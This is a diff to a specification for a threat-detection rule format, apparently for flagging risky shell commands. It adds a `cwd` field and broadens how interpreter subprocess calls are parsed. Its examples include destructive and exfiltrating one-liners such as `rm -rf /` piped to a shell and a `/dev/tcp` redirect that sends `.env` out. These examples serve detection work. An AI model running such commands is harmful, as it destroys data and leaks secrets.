@@ -81,7 +81,7 @@ Exactly one of `match` or `correlation` must be present. Required:
 | Field | Required | Type / values | Meaning |
 |---|---|---|---|
 | `id` | yes | string `^[a-z0-9][a-z0-9-]*$` | Stable unique identity. Unique across the pack. Flows to `policy.id` on a finding. |
-| `spec` | no | `threat-rules/v<major>[.<minor>]` (default `threat-rules/v1`) | Minimum spec version the rule needs. Required when the rule uses a feature added after v1: v1.1 or later for `correlation.order`, v1.2 or later for `e.command.parsed_commands`, v1.3 or later for its `args`, `file_reads`, `file_writes`, `script_sends`, `socket_redirects`, `runs_read`, `span`, `earlier_stages` and `later_stages`, for `e.command.parsed_incomplete`, and for a call to a [predicate](#predicates). See [Versioning](#versioning). |
+| `spec` | no | `threat-rules/v<major>[.<minor>]` (default `threat-rules/v1`) | Minimum spec version the rule needs. Required when the rule uses a feature added after v1: v1.1 or later for `correlation.order`, v1.2 or later for `e.command.parsed_commands`, v1.3 or later for its `args`, `cwd`, `file_reads`, `file_writes`, `script_sends`, `socket_redirects`, `runs_read`, `span`, `earlier_stages` and `later_stages`, for `e.command.parsed_incomplete`, and for a call to a [predicate](#predicates). See [Versioning](#versioning). |
 | `version` | yes | int ≥ 1 | Rule content revision; bump on logic change. |
 | `title` | yes | string | Human-readable name. Flows to `policy.name`. |
 | `description` | no | string | Documentation only; never evaluated. |
@@ -219,7 +219,8 @@ the steps in both orders still fires once. A single event never satisfies two st
   follow each other), `env` (the `NAME=value`
   assignments before the command, `""` for an unknown value), `file_effects` (the files the
   command evidently writes, `{path, op}`, of the command `name` names), `file_writes` (the
-  same with every path as written, below), `file_reads` and
+  same with every path as written, below), `cwd` (the directory the command runs in, below),
+  `file_reads` and
   `script_sends` (the files it evidently takes as input and the ones its inline script
   sends, below), `socket_redirects` (its redirections to a network pseudo-file, below),
   `runs_read` and `span` (whether the command line it hands on was read, and the part of
@@ -229,7 +230,7 @@ the steps in both orders still fires once. A single event never satisfies two st
   `{ a; b; } | c` or `(a) | c` carries that stage unless it is a stage of an inner pipeline
   or inside a substitution) and `nested` (inside a command or process
   substitution, or inside a command line another command hands on). When `sh`, `bash`,
-  `zsh`, `dash` or `ksh` appears
+  `zsh`, `dash` or `ksh` appears (since v1.3 by any path, as `name` is read: `~/bin/bash`)
   as a word of a command with an option cluster containing `c`, its first operand, if known,
   is read the same way, and its commands follow the shell's with
   `nested` true and pipeline numbers of their own. Since v1.3 the same holds for the
@@ -253,11 +254,19 @@ the steps in both orders still fires once. A single event never satisfies two st
   here-document or here-string and no file, each with every word known and no output
   redirection (`echo 'rm -rf /' | sh`, `cat <<'EOF' | sudo bash`); and for the command lines
   the inline script of `python`, `node`, `bun`, `deno`, `ruby` or `php` (its `-c`/`-e`
-  value, or the here-document it reads) runs through `os.system`, `os.popen`,
-  `subprocess.run`/`call`/`check_call`/`check_output`/`Popen`/`getoutput`,
-  `child_process`'s `exec`/`execFile`/`spawn` and their `Sync` forms, Ruby's `system`,
-  `exec`, `spawn`, backticks and `%x(..)`, and PHP's `system`, `exec`, `shell_exec`,
-  `passthru`, `popen` and `proc_open`, when the command is written out: a string literal is
+  value, `deno eval`'s script, or the here-document it reads) runs through Python's
+  `os.system`, `os.popen`,
+  `subprocess.run`/`call`/`check_call`/`check_output`/`getoutput`/`getstatusoutput`,
+  `sp.run` and `sp.call` (subprocess imported as `sp`), and `Popen`, `check_output`,
+  `check_call`, `getoutput` and `getstatusoutput` as a function or a method of any name;
+  JavaScript's
+  `exec`, `execFile`, `spawn` and their `Sync` forms, in a script that names
+  `child_process`; Ruby's `system`, `exec`, `spawn`, `IO.popen`, `Process.spawn`,
+  `Open3.capture2`, `Open3.capture2e`, `Open3.capture3`, `Open3.popen3`, backticks and
+  `%x(..)` (also `%x{..}`, `%x[..]`, `%x<..>`), and PHP's `system`, `exec`, `shell_exec`,
+  `passthru`, `popen` and `proc_open` and backticks (a Ruby or PHP call only as written, so
+  `conn.exec(..)` and `$db->exec(..)` are not; a Ruby call also without parentheses), when
+  the command is written out: a string literal is
   a command line, a list of string literals its words, and an element or a further argument
   that is not a literal is a word whose value is unknown. A literal the language fills in
   (an f-string, `${..}`, `#{..}`) or that is an operand of an expression is not read.
@@ -273,8 +282,8 @@ the steps in both orders still fires once. A single event never satisfies two st
   quote, here-document, substitution or compound command) yields the commands before the
   point where it became incomplete; one that does not parse yields the empty list, so a
   rule that must not miss such captures keeps a `command.command` fallback for it. The
-  reference derivation is `threatrules.ParsedCommands` over `shellcmd.Parse`, and the file
-  effects are `shellcmd.FileEffects`.
+  reference derivation is `threatrules.ParsedCommands` over `shellcmd.Read`, and the file
+  effects are `shellcmd.Command.FileEffects`.
 
   The two v1.3 changes to `name` and to which commands are listed apply to every rule an
   engine at v1.3 or later evaluates, whatever `spec` the rule declares: an engine derives the
@@ -301,11 +310,13 @@ the steps in both orders still fires once. A single event never satisfies two st
   therefore reads a line only within these bounds, and a line past one has no
   `parsed_commands` and is incomplete, which leaves it to a rule's reading of its text: the
   brace expansions of the line produce at most 1,024 words, and those of its scripts
-  together as many again; the commands of the line and of the scripts it runs number at
-  most 256 and come to at most 4,096 words. A line cut inside more than 32 open constructs
-  is incomplete with no commands as well. A script is read, and its commands listed, while
-  the scripts of the line come to at most 16 KiB; a script past that is left unread like
-  the code of an interpreter, so the command that runs it has `runs_read` false.
+  together as many again; the text of the command lines the line hands on (its scripts,
+  carried command lines, what a pipe sends a shell, what an inline script runs) comes to at
+  most 16 KiB together; and the commands of the line and of what it hands on number at most
+  256 and come to at most 4,096 words. A line cut inside more than 32 open constructs is
+  incomplete with no commands as well. A command line handed on more than three levels deep
+  is not a bound: it is not read, the command that hands it on has `runs_read` false, and
+  the line is complete.
 - `file_writes` (since v1.3; a rule that selects it MUST declare `spec: threat-rules/v1.3` or
   later) is a field of each `parsed_commands` entry: the files the command evidently writes,
   a list of `{path, op}` with the `op` values of `file_effects` (`write`, `append`, `touch`,
@@ -320,9 +331,10 @@ the steps in both orders still fires once. A single event never satisfies two st
   targets are all known the two lists are equal.
 
   The writes are the targets of the command's output redirections (`>`, `>|`, `&>` and
-  `>&file` are `write`, `>>` and `&>>` are `append`; a path under `/dev/` and the target of
-  `>&` when its value is unknown, which may be a descriptor, are left out), and the operands
-  of the command `name` names: `rm`, `unlink` and `git rm` (`delete`), `shred` (`write`, or
+  `>&file` are `write`, `>>` and `&>>` are `append`; the target of `>&` that names a
+  descriptor (`2`, `3-`, `-`) or whose value is unknown, which may be one, is left out), and
+  the operands of the command `name` names: `rm`, `unlink` and `git rm` (`delete`), `shred`
+  (`write`, or
   `delete` with `-u`), `touch`, `truncate`,
   `tee` (`write`, or `append` with `-a`), in-place `sed`, `gsed` and `perl` (`edit`), `cp`
   and `install` (`write`, the destination), `ln` (`link`) and `mv` and `git mv` (`move_from`
@@ -335,7 +347,8 @@ the steps in both orders still fires once. A single event never satisfies two st
   URL ends in, under `-P`, and nothing for a recursive download or `--spider`; the `of=`
   file of `dd`; and, when the last operand of `scp` or `rsync` is on this host, that
   operand, or each source's base name under it as for `cp`. Standard output (`-`) and a path
-  under `/dev/` are no file.
+  under `/dev/` are no file, for every command and every redirection (`tee /dev/null` and
+  `cp x /dev/null` write none).
 
   `file_writes` alone also lists a directory a command puts files into, as the directory
   with one trailing slash and `op` `write`, because which files land there is not on the
@@ -344,6 +357,24 @@ the steps in both orders still fires once. A single event never satisfies two st
   creates (its second operand, else the repository's name), and the destination of `rsync`
   for a source written with a trailing slash. The reference derivation is
   `shellcmd.FileWrites`.
+- `cwd` (since v1.3; a rule that selects it MUST declare `spec: threat-rules/v1.3` or later)
+  is a field of each `parsed_commands` entry: the directory the command runs in when the
+  line changed into it before the command, as a literal path, and `""` otherwise. It is the
+  operand of the last `cd` or `pushd` before the command, in line order, in the shell the
+  command runs in: a `cd` inside a subshell (`( .. )`), a command or process substitution,
+  a stage of a pipeline of two or more stages, or a statement run in the background
+  (`&`) reaches the commands after it inside that, and none after it. It is written with one
+  trailing slash, as `file_writes` writes a directory. An absolute operand is the path
+  cleaned (`/tmp/x/../y` is `/tmp/y/`); a relative one is joined to the `cwd` the
+  `cd` itself has, and unknown when that is `""`. Options (`-P`, `-L`) and `--` are skipped.
+  It is `""` when the line has not changed directory and when where it did is unknown: `cd`
+  alone, `cd -`, `pushd +1`, `popd`, an operand that is not a literal, any command after a
+  `cd`, `pushd` or `popd` inside a loop or a function's body, and every command of that
+  loop, or of the line for a function. A command line another command hands on starts in
+  that command's `cwd` when a shell, an interpreter, `eval` or `xargs` runs it, and in an
+  unknown directory otherwise (`ssh`, `docker exec`, `sudo -i`). A relative path of
+  `file_writes` names the file under `cwd`. The reference derivation is `shellcmd`'s
+  `Command.Dir`.
 - `file_reads` (since v1.3; a rule that selects it MUST declare `spec: threat-rules/v1.3` or
   later) is a field of each `parsed_commands` entry: the files whose content the command
   evidently takes in, a list of `{path, via}`. `path` is the word as written with its quotes
@@ -460,8 +491,8 @@ the steps in both orders still fires once. A single event never satisfies two st
   here-document that is not a script is not read as commands, and what a script of another
   language does with a file through a variable is not followed. A shell that reads its
   script from a here-document takes in what the body expands, and its script's commands do
-  not read that as their standard input. The reference derivation is `shellcmd.FileReads`
-  over `shellcmd.WithScripts`.
+  not read that as their standard input. The reference derivation is `shellcmd.Read`
+  (`Line.Reads`).
 - `socket_redirects` (since v1.3; a rule that selects it MUST declare
   `spec: threat-rules/v1.3` or later) on an entry of `e.command.parsed_commands` lists the
   command's redirections to or from bash's network pseudo-files, each `{path, op}`. `path` is
@@ -475,7 +506,7 @@ the steps in both orders still fires once. A single event never satisfies two st
   `exec 3<>/dev/tcp/h/1; cat .env >&3` the `exec` entry has `{/dev/tcp/h/1, readwrite}` and
   the `cat` entry `{/dev/tcp/h/1, write}`. A later `exec` that closes the descriptor or
   points it elsewhere ends that. The same path as a word of a command is not a redirection.
-  The reference derivation is `shellcmd.SocketRedirects`.
+  The reference derivation is `shellcmd.Read` (`Line.Sockets`).
 - `runs_read` (since v1.3; a rule that selects it MUST declare `spec: threat-rules/v1.3` or
   later) on an entry of `e.command.parsed_commands` is true when the command hands a command
   line to another program to run (a shell's `-c` script, the here-document it reads or the
@@ -490,7 +521,7 @@ the steps in both orders still fires once. A single event never satisfies two st
   tell a program whose commands answer for themselves from one it cannot see into.
   For `xargs` and `find` it says only that the command they run is listed: that command's
   operands come from a pipe or from what `find` matches, which the entry does not hold.
-  The reference derivation is `shellcmd.Command.RunsRead` over `shellcmd.WithScripts`.
+  The reference derivation is `shellcmd.Command.RunsRead` over `shellcmd.Read`.
 - `span` (since v1.3; a rule that selects it MUST declare `spec: threat-rules/v1.3` or
   later) on an entry of `e.command.parsed_commands` is the part of the command line that can
   decide what the command runs, as text. It exists for the rule that must match text because
@@ -515,7 +546,7 @@ the steps in both orders still fires once. A single event never satisfies two st
   `$`, `#`, `!`) and no statement at or before the command that uses it assigns it. An entry
   that comes from a command line another command hands on has the `span` of the entry of the
   line itself that it came from. The span over-approximates on purpose and always holds the
-  command's own text. The reference derivation is `shellcmd.Spans`.
+  command's own text. The reference derivation is `shellcmd.Read` (`Line.Spans`).
 - `earlier_stages` and `later_stages` (since v1.3; a rule that selects either MUST declare
   `spec: threat-rules/v1.3` or later) on an entry of `e.command.parsed_commands` are lists of
   integers: the 0-based indexes, in `e.command.parsed_commands` and in ascending order, of the
@@ -738,7 +769,7 @@ v1.1 field, as an unknown field, and refuse the directory that contains it.
 
 ### Changelog
 
-- **v1.3**: `args`, `file_reads`, `file_writes`, `script_sends`, `socket_redirects`,
+- **v1.3**: `args`, `cwd`, `file_reads`, `file_writes`, `script_sends`, `socket_redirects`,
   `runs_read`, `span`, `earlier_stages` and `later_stages` on each entry of
   `e.command.parsed_commands`, and `e.command.parsed_incomplete`.
   `name` and `file_effects` find the command behind `timeout`, `nice`, `ionice`, `stdbuf`,
